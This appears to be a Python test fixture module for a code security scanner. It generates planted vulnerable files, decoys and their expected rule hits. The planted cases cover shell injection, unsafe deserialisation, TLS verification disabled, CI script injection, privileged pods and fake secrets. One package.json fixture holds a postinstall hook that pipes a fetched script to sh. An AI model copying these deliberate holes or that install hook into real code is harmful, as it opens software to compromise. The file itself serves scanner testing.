"""A corpus with known planted defects, and what each one should produce.

Line coverage says every line ran. It does not say a rule fires on the code
it was written for. This module holds the other measurement: a small tree of
files with defects planted on purpose, each one paired with the rule that is
supposed to name it, so the miss rate can be counted instead of assumed.

Two rules shape how it is written.

The corpus is built at run time, never committed. A directory of deliberately
vulnerable files inside this repository would be read by this repository's own
scanners, by its self-review job, and by anyone else's scanner that walks it.

No credential-shaped literal is written here, and no vulnerable line is
written as a literal either. Both are assembled from fragments, the same way
``jscr.redaction.secrets`` assembles its rule prefixes, so that a pattern this
repository detects never appears in this repository's own source.

A case is planted or a decoy. A planted case says which rule ids must report
it and on which line. A decoy says a scanner must stay quiet: it is code that
looks like the real thing to a careless pattern and is not it. A rule that
cannot tell them apart is not usable, however good its recall looks.
"""

from __future__ import annotations

import os
from typing import Dict, List, Sequence, Tuple

from tests.support import (
    fake_assigned_secret,
    fake_aws_key_id,
    fake_connection_string,
    fake_model_key,
    fake_private_key_block,
    fake_vcs_token,
)


class Case(object):
    """One planted defect, or one decoy that must stay quiet."""

    __slots__ = ("case_id", "path", "content", "expect", "why")

    def __init__(
        self,
        case_id: str,
        path: str,
        content: str,
        expect: Sequence[Tuple[str, str]] = (),
        why: str = "",
    ) -> None:
        self.case_id = case_id
        self.path = path
        self.content = content
        #: (rule_id, a substring of the line the finding must point at).
        self.expect: Tuple[Tuple[str, str], ...] = tuple(expect)
        self.why = why

    @property
    def decoy(self) -> bool:
        return not self.expect

    def line_of(self, needle: str) -> int:
        """The 1-based line holding ``needle``, or 0 when it is absent."""
        for number, line in enumerate(self.content.splitlines(), start=1):
            if needle in line:
                return number
        return 0


# -- fragments ----------------------------------------------------------
# Every one of these builds a line this repository's own rules match. They
# are split so the matchable form exists only at run time.

_SHELL_TRUE = "shell" + "=True"
_OS_SYSTEM = "os." + "system("
_EVAL = "ev" + "al("
_PICKLE = "pickle." + "loads("
_YAML_LOAD = "yaml." + "load("
_VERIFY_OFF = "verify" + "=False"
_MKTEMP = "tempfile." + "mktemp("
_ANY_INTERFACE = '"0.0.0' + '.0"'
_INNER_HTML = ".inner" + "HTML ="
_CHILD_EXEC = "child_process." + "exec("
_REJECT_OFF = "reject" + "Unauthorized: false"
_MATH_RANDOM = "Math." + "random()"
_PR_TARGET = "pull_request" + "_target:"
_PRIVILEGED = "privileged" + ": true"
_HOST_NETWORK = "hostNetwork" + ": true"
_RUN_AS_ROOT = "runAsUser" + ": 0"
_HOST_PATH = "hostPath" + ":"
_RUNTIME_SOCKET = "/var/run/" + "docker.sock"
_OPEN_CIDR = 'cidr_blocks = ["0.0.0' + '.0/0"]'
_PUBLIC_ACL = 'acl = "public' + '-read"'
_UNENCRYPTED = "storage_encrypted = " + "false"
_WILDCARD = '"Action": ' + '"*"'


def _python(*lines: str) -> str:
    return "\n".join(lines) + "\n"


def _cases() -> List[Case]:
    cases: List[Case] = []
    add = cases.append

    # -- builtin: Python ------------------------------------------------
    add(
        Case(
            "py-shell-true",
            "src/runner.py",
            _python(
                "import subprocess",
                "",
                "def run(name):",
                '    return subprocess.run("ls " + name, ' + _SHELL_TRUE + ")",
            ),
            [("jscr/py-shell-true", _SHELL_TRUE)],
            "A shell is asked to parse a value the caller supplied.",
        )
    )
    add(
        Case(
            "py-os-system",
            "src/deploy.py",
            _python("import os", "", "def push(tag):", "    " + _OS_SYSTEM + '"git push " + tag)'),
            [("jscr/py-os-system", _OS_SYSTEM)],
            "os.system is a shell with a string argument.",
        )
    )
    add(
        Case(
            "py-eval-exec",
            "src/calc.py",
            _python("def compute(expression):", "    return " + _EVAL + "expression)"),
            [("jscr/py-eval-exec", _EVAL)],
            "A runtime value is executed as code.",
        )
    )
    add(
        Case(
            "py-pickle-load",
            "src/cache.py",
            _python("import pickle", "", "def load(blob):", "    return " + _PICKLE + "blob)"),
            [("jscr/py-pickle-load", _PICKLE)],
            "pickle constructs whatever object the input names.",
        )
    )
    add(
        Case(
            "py-yaml-load",
            "src/settings.py",
            _python("import yaml", "", "def read(text):", "    return " + _YAML_LOAD + "text)"),
            [("jscr/py-yaml-load", _YAML_LOAD)],
            "yaml.load without a safe loader builds arbitrary objects.",
        )
    )
    add(
        Case(
            "py-verify-off",
            "src/client.py",
            _python(
                "import requests",
                "",
                "def fetch(url):",
                "    return requests.get(url, " + _VERIFY_OFF + ")",
            ),
            [("jscr/py-verify-off", _VERIFY_OFF)],
            "TLS verification is switched off, so any certificate is accepted.",
        )
    )
    add(
        Case(
            "py-md5-sha1-password",
            "src/accounts.py",
            _python(
                "import hashlib",
                "",
                "def store(password):",
                "    return hashlib." + "md5(password" + ".encode()).hexdigest()",
            ),
            [("jscr/py-md5-sha1-password", "md5")],
            "A password is hashed with a digest built to be fast.",
        )
    )
    add(
        Case(
            "py-sql-format",
            "src/records.py",
            _python(
                "def find(cursor, name):",
                "    cursor." + 'execute("SELECT * FROM users WHERE name = " + name)',
            ),
            [("jscr/py-sql-format", "execute(")],
            "The query is built by joining strings, so the value becomes syntax.",
        )
    )
    add(
        Case(
            "py-assert-auth",
            "src/guard.py",
            _python(
                "def admin_only(user):", "    " + "assert user.is_" + "admin", "    return True"
            ),
            [("jscr/py-assert-auth", "assert user")],
            "python -O removes the check and leaves the function permissive.",
        )
    )
    add(
        Case(
            "py-tempfile-mktemp",
            "src/scratch.py",
            _python("import tempfile", "", "def path():", "    return " + _MKTEMP + ")"),
            [("jscr/py-tempfile-mktemp", _MKTEMP)],
            "The name is returned before the file exists, so it can be taken.",
        )
    )
    add(
        Case(
            "py-bind-all",
            "src/serve.py",
            _python("def start(app):", "    app.run(host=" + _ANY_INTERFACE + ", port=8080)"),
            [("jscr/py-bind-all", _ANY_INTERFACE)],
            "The service answers on every interface the host has.",
        )
    )

    # -- builtin: JavaScript --------------------------------------------
    add(
        Case(
            "js-eval",
            "src/web/dispatch.js",
            _python("function run(source) {", "  return " + _EVAL + "source);", "}"),
            [("jscr/js-eval", _EVAL)],
            "A runtime value is executed as code.",
        )
    )
    add(
        Case(
            "js-inner-html",
            "src/web/render.js",
            _python("export function show(el, text) {", "  el" + _INNER_HTML + " text;", "}"),
            [("jscr/js-inner-html", _INNER_HTML)],
            "Markup in the value becomes markup on the page.",
        )
    )
    add(
        Case(
            "js-child-process-exec",
            "src/web/build.js",
            _python(
                "const child_process = require('child_process');",
                "export function build(target) {",
                "  " + _CHILD_EXEC + "'make ' + target);",
                "}",
            ),
            [("jscr/js-child-process-exec", _CHILD_EXEC)],
            "The command string is parsed by a shell.",
        )
    )
    add(
        Case(
            "js-tls-reject-off",
            "src/web/agent.js",
            _python("const agent = new https.Agent({", "  " + _REJECT_OFF, "});"),
            [("jscr/js-tls-reject-off", _REJECT_OFF)],
            "TLS verification is switched off for every request on this agent.",
        )
    )
    add(
        Case(
            "js-math-random-token",
            "src/web/session.js",
            _python(
                "export function newSession() {",
                "  const token = " + _MATH_RANDOM + ".toString(36); // session token",
                "  return token;",
                "}",
            ),
            [("jscr/js-math-random-token", _MATH_RANDOM)],
            "Math.random is predictable, so the token is guessable.",
        )
    )

    # -- builtin: any file ----------------------------------------------
    add(
        Case(
            "generic-private-key",
            "deploy/id_rsa",
            fake_private_key_block() + "\n",
            [
                ("jscr/generic-private-key", "BEGIN"),
                ("jscr/committed-secret", "BEGIN"),
            ],
            "A private key in the tree is a key that must be rotated.",
        )
    )
    add(
        Case(
            "docker-root-user",
            "Dockerfile",
            _python("FROM python:3.12-slim", "USER " + "root", 'CMD ["python", "app.py"]'),
            [("jscr/docker-root-user", "USER")],
            "Nothing drops privilege before the entrypoint.",
        )
    )
    add(
        Case(
            "generic-todo-security",
            "src/session.py",
            _python(
                "def check(token):",
                "    # TO" + "DO: sanitise the token before use",
                "    return True",
            ),
            [("jscr/generic-todo-security", "sanitise")],
            "A security gap the author already knew about.",
        )
    )

    # -- builtin: CI ----------------------------------------------------
    add(
        Case(
            "ci-pull-request-target",
            ".github/workflows/fork.yml",
            _python(
                "name: fork",
                "permissions:",
                "  contents: read",
                "on:",
                "  " + _PR_TARGET,
                "jobs:",
                "  build:",
                "    runs-on: ubuntu-latest",
                "    steps:",
                "      - run: make",
            ),
            [("jscr/ci-pull-request-target", _PR_TARGET)],
            "The fork's code runs with this repository's secrets.",
        )
    )
    add(
        Case(
            "ci-unpinned-action",
            ".github/workflows/pinning.yml",
            _python(
                "name: pinning",
                "permissions:",
                "  contents: read",
                "on: push",
                "jobs:",
                "  build:",
                "    runs-on: ubuntu-latest",
                "    steps:",
                "      - " + "uses: actions/checkout@v4",
            ),
            [("jscr/ci-unpinned-action", "uses:")],
            "A tag can be moved to a different commit by whoever owns it.",
        )
    )
    add(
        Case(
            "ci-script-injection",
            ".github/workflows/greet.yml",
            _python(
                "name: greet",
                "permissions:",
                "  contents: read",
                "on: issues",
                "jobs:",
                "  hello:",
                "    runs-on: ubuntu-latest",
                "    steps:",
                '      - run: echo "${{ github.event.' + 'issue.title }}"',
            ),
            [("jscr/ci-script-injection", "github.event")],
            "An issue title is pasted into a shell script.",
        )
    )

    # -- workflow permissions -------------------------------------------
    add(
        Case(
            "ci-permissions-missing",
            ".github/workflows/silent.yml",
            _python(
                "name: silent",
                "on: push",
                "jobs:",
                "  build:",
                "    runs-on: ubuntu-latest",
                "    steps:",
                "      - run: make",
            ),
            [("jscr/ci-permissions-missing", "on: push")],
            "No permissions block, so the repository default applies.",
        )
    )
    add(
        Case(
            "ci-permissions-write-all",
            ".github/workflows/everything.yml",
            _python(
                "name: everything",
                "permissions: " + "write-all",
                "on: push",
                "jobs:",
                "  build:",
                "    runs-on: ubuntu-latest",
                "    steps:",
                "      - run: make",
            ),
            [("jscr/ci-permissions-write-all", "permissions:")],
            "Every write scope at once, which no job needs.",
        )
    )
    add(
        Case(
            "ci-permissions-broad",
            ".github/workflows/broad.yml",
            _python(
                "name: broad",
                "permissions:",
                "  contents: " + "write",
                "on: push",
                "jobs:",
                "  build:",
                "    runs-on: ubuntu-latest",
                "    steps:",
                "      - run: make",
            ),
            [("jscr/ci-permissions-broad", "contents:")],
            "contents: write lets a compromised step push commits.",
        )
    )

    # -- committed secrets ----------------------------------------------
    add(
        Case(
            "secret-aws-key-id",
            "config/aws.env",
            "AWS_ACCESS_KEY_ID=" + fake_aws_key_id() + "\n",
            [("jscr/committed-secret", "AWS_ACCESS")],
            "A cloud key id committed beside the code it authenticates.",
        )
    )
    add(
        Case(
            "secret-vcs-token",
            "config/ci.env",
            "TOKEN=" + fake_vcs_token() + "\n",
            [("jscr/committed-secret", "TOKEN=")],
            "A forge token grants whatever the account it belongs to grants.",
        )
    )
    add(
        Case(
            "secret-model-key",
            "config/model.env",
            "MODEL_KEY=" + fake_model_key() + "\n",
            [("jscr/committed-secret", "MODEL_KEY")],
            "A model provider key is a billable credential.",
        )
    )
    add(
        Case(
            "secret-connection-string",
            "config/database.env",
            "DATABASE_URL=" + fake_connection_string() + "\n",
            [("jscr/committed-secret", "DATABASE_URL")],
            "The password is inside the URL, so it reaches every log that prints it.",
        )
    )
    add(
        Case(
            "secret-assigned",
            "src/integration.py",
            fake_assigned_secret() + "\n",
            [("jscr/committed-secret", "api_secret")],
            "A named secret assigned a long literal value.",
        )
    )

    # -- infrastructure as code -----------------------------------------
    add(
        Case(
            "iac-open-ingress",
            "infra/network.tf",
            _python(
                'resource "aws_security_group" "web" {',
                "  ingress {",
                "    from_port = 22",
                "    " + _OPEN_CIDR,
                "  }",
                "}",
            ),
            [("jscr/iac-open-ingress", "cidr_blocks")],
            "Every host on the internet may reach the port.",
        )
    )
    add(
        Case(
            "iac-public-bucket",
            "infra/storage.tf",
            _python('resource "aws_s3_bucket" "assets" {', "  " + _PUBLIC_ACL, "}"),
            [("jscr/iac-public-bucket", "acl")],
            "Every object in the bucket is downloadable without credentials.",
        )
    )
    add(
        Case(
            "iac-unencrypted",
            "infra/database.tf",
            _python('resource "aws_db_instance" "main" {', "  " + _UNENCRYPTED, "}"),
            [("jscr/iac-unencrypted", "storage_encrypted")],
            "Encryption at rest was switched off on purpose.",
        )
    )
    add(
        Case(
            "iac-plaintext-secret",
            "infra/app.tf",
            _python(
                'resource "aws_db_instance" "main" {',
                "  " + "password = " + '"' + "q8vn2rk4wm7t" + '"',
                "}",
            ),
            [("jscr/iac-plaintext-secret", "password")],
            "A literal credential reaches the state file and the plan output.",
        )
    )
    add(
        Case(
            "iac-wildcard-policy",
            "infra/policy.tf",
            _python(
                'resource "aws_iam_policy" "app" {',
                "  policy = jsonencode({",
                '    "Statement": [{' + _WILDCARD + "}]",
                "  })",
                "}",
            ),
            [("jscr/iac-wildcard-policy", "Action")],
            "A stolen key would hold every action the service has.",
        )
    )
    add(
        Case(
            "k8s-privileged",
            "deploy/k8s/api.yaml",
            _python(
                "apiVersion: v1",
                "kind: Pod",
                "spec:",
                "  containers:",
                "    - name: api",
                "      securityContext:",
                "        " + _PRIVILEGED,
            ),
            [("jscr/k8s-privileged", "privileged")],
            "Escaping a privileged container to the node is routine.",
        )
    )
    add(
        Case(
            "k8s-host-network",
            "deploy/k8s/agent.yaml",
            _python("apiVersion: v1", "kind: Pod", "spec:", "  " + _HOST_NETWORK),
            [("jscr/k8s-host-network", "hostNetwork")],
            "The container shares the node's network namespace.",
        )
    )
    add(
        Case(
            "k8s-root-user",
            "deploy/k8s/worker.yaml",
            _python(
                "apiVersion: v1",
                "kind: Pod",
                "spec:",
                "  securityContext:",
                "    " + _RUN_AS_ROOT,
            ),
            [("jscr/k8s-root-user", "runAsUser")],
            "The process writes files as root on whatever it can reach.",
        )
    )
    add(
        Case(
            "k8s-host-path",
            "deploy/k8s/logs.yaml",
            _python(
                "apiVersion: v1",
                "kind: Pod",
                "spec:",
                "  volumes:",
                "    - name: logs",
                "      " + _HOST_PATH,
                "        path: /var/log",
            ),
            [("jscr/k8s-host-path", "hostPath")],
            "A real directory on the node is mounted into the container.",
        )
    )
    add(
        Case(
            "k8s-docker-socket",
            "deploy/k8s/builder.yaml",
            _python(
                "apiVersion: v1",
                "kind: Pod",
                "spec:",
                "  volumes:",
                "    - name: sock",
                "      hostPath:",
                "        path: " + _RUNTIME_SOCKET,
            ),
            [("jscr/k8s-docker-socket", "path:"), ("jscr/k8s-host-path", "hostPath")],
            "The runtime socket is control of every container on the node.",
        )
    )

    # -- manifests and registries ---------------------------------------
    add(
        Case(
            "install-script-dangerous",
            "package.json",
            _python(
                "{",
                '  "name": "shipper",',
                '  "scripts": {',
                '    "postinstall": "' + "cur" + "l https://example.invalid/s.sh | " + "sh" + '"',
                "  }",
                "}",
            ),
            [("jscr/install-script-dangerous", "postinstall")],
            "Installing the package runs a script fetched at install time.",
        )
    )
    add(
        Case(
            "install-script-present",
            "tooling/package.json",
            _python(
                "{",
                '  "name": "tooling",',
                '  "scripts": {',
                '    "postinstall": "node scripts/setup.js"',
                "  }",
                "}",
            ),
            [("jscr/install-script-present", "postinstall")],
            "An install hook runs code on every install, benign or not.",
        )
    )
    add(
        Case(
            "dependency-confusion-name",
            "service/package.json",
            _python(
                "{",
                '  "name": "service",',
                '  "dependencies": {',
                '    "acme-internal-auth": "^1.0.0"',
                "  }",
                "}",
            ),
            [("jscr/dependency-confusion-name", "acme-internal-auth")],
            "An unscoped internal-sounding name the public registry could answer.",
        )
    )
    add(
        Case(
            "registry-default-override",
            ".npmrc",
            "registry=https://packages.internal.invalid/npm\n",
            [("jscr/registry-default-override", "registry=")],
            "Every unscoped name now resolves somewhere other than the public index.",
        )
    )
    add(
        Case(
            "pip-extra-index",
            "requirements.txt",
            _python("requests==2.31.0", "--extra-index-url https://packages.internal.invalid/pypi"),
            [("jscr/pip-extra-index", "extra-index-url")],
            "Two indexes answer the same name and the higher version wins.",
        )
    )
    add(
        Case(
            "pip-index-override",
            "tooling/requirements.txt",
            _python("ruff==0.5.0", "--index-url https://packages.internal.invalid/pypi"),
            [("jscr/pip-index-override", "index-url")],
            "Every name comes from a non-public index.",
        )
    )

    # -- build artefacts in source --------------------------------------
    add(
        Case(
            "obfuscated-identifiers",
            "src/web/vendor.js",
            _python(*["var _0x{0:04x} = {1};".format(4096 + index, index) for index in range(8)]),
            [("jscr/obfuscated-identifiers", "_0x")],
            "Identifiers renamed to hex, which no author does by hand.",
        )
    )
    add(
        Case(
            "hex-escaped-strings",
            "src/web/strings.js",
            "const message = '" + ("\\x41" * 48) + "';\n",
            [("jscr/hex-escaped-strings", "const message")],
            "Text escaped character by character to keep it out of a search.",
        )
    )
    add(
        Case(
            "encoded-blob",
            "src/web/payload.js",
            "const blob = '" + ("QUJDREVGR0hJSktM" * 20) + "';\n",
            [("jscr/encoded-blob", "const blob")],
            "A base64 run long enough to hold code, not a key.",
        )
    )
    add(
        Case(
            "minified-file",
            "src/web/bundle.js",
            "function a(b){return b+1}" + ("var c=a(1);" * 60) + "\n",
            [("jscr/minified-file", "function a")],
            "One line of generated code where source is expected.",
        )
    )

    # -- licences --------------------------------------------------------
    add(
        Case(
            "licence-strong-copyleft",
            "app/package-lock.json",
            _python(
                "{",
                '  "name": "app",',
                '  "lockfileVersion": 3,',
                '  "packages": {',
                '    "node_modules/reader": {"version": "1.0.0", "license": "GPL-3.0"},',
                '    "node_modules/writer": {"version": "2.0.0"}',
                "  }",
                "}",
            ),
            [
                ("jscr/licence-strong-copyleft", "{"),
                ("jscr/licence-undeclared", "{"),
            ],
            "One dependency's obligation reaches this source; one declares nothing.",
        )
    )

    # -- decoys ----------------------------------------------------------
    add(
        Case(
            "decoy-safe-subprocess",
            "src/safe_runner.py",
            _python(
                "import subprocess",
                "",
                "def run(name):",
                '    return subprocess.run(["ls", name], check=True)',
            ),
            (),
            "An argument list, which is the fix the shell rule recommends.",
        )
    )
    add(
        Case(
            "decoy-safe-yaml",
            "src/safe_settings.py",
            _python(
                "import yaml",
                "",
                "def read(text):",
                "    return yaml.safe_load(text)",
            ),
            (),
            "safe_load is the recommended call and must not be reported.",
        )
    )
    add(
        Case(
            "decoy-placeholder-secret",
            "config/example.env",
            _python("API_KEY=" + '"' + "changeme" + '"', "PASSWORD=" + '"' + "your_password" + '"'),
            (),
            "An example file. Reporting it would make the tool unusable.",
        )
    )
    add(
        Case(
            "decoy-parameterised-sql",
            "src/safe_records.py",
            _python(
                "def find(cursor, name):",
                '    cursor.execute("SELECT * FROM users WHERE name = %s", (name,))',
            ),
            (),
            "Parameters are passed to the driver, which is the fix.",
        )
    )
    add(
        Case(
            "decoy-pinned-action",
            ".github/workflows/pinned.yml",
            _python(
                "name: pinned",
                "permissions:",
                "  contents: read",
                "on: push",
                "jobs:",
                "  build:",
                "    runs-on: ubuntu-latest",
                "    steps:",
                "      - uses: actions/checkout@" + "b4ffde65f46336ab88eb53be808477a3936bae11",
            ),
            (),
            "Pinned to a commit and read-only, which is what the rules ask for.",
        )
    )
    add(
        Case(
            "decoy-scoped-registry",
            "tooling/.npmrc",
            "@acme:registry=https://packages.internal.invalid/npm\n",
            (),
            "A scope bound to an internal registry cannot be confused.",
        )
    )
    add(
        Case(
            "minified-in-build-directory",
            "vendor/dist/library.min.js",
            "function a(b){return b+1}" + ("var c=a(1);" * 60) + "\n",
            [("jscr/minified-file", "function a")],
            "Still reported, at Info, because the path says it was generated.",
        )
    )
    add(
        Case(
            "decoy-localhost-bind",
            "src/local_serve.py",
            _python("def start(app):", '    app.run(host="127.0.0.1", port=8080)'),
            (),
            "Bound to the loopback address, which is not exposure.",
        )
    )

    return cases


CASES: Tuple[Case, ...] = tuple(_cases())


def materialise(root: str) -> List[str]:
    """Write the corpus under ``root``. Returns the paths, repo-relative."""
    written: List[str] = []
    for case in CASES:
        target = os.path.join(root, case.path.replace("/", os.sep))
        parent = os.path.dirname(target)
        if parent and not os.path.isdir(parent):
            os.makedirs(parent)
        with open(target, "w", encoding="utf-8", newline="\n") as handle:
            handle.write(case.content)
        written.append(case.path)
    return written


def expectations() -> List[Dict[str, object]]:
    """Every planted defect as (case, path, line, rule)."""
    rows: List[Dict[str, object]] = []
    for case in CASES:
        for rule_id, needle in case.expect:
            rows.append(
                {
                    "case": case.case_id,
                    "path": case.path,
                    "line": case.line_of(needle),
                    "rule": rule_id,
                    "why": case.why,
                }
            )
    return rows
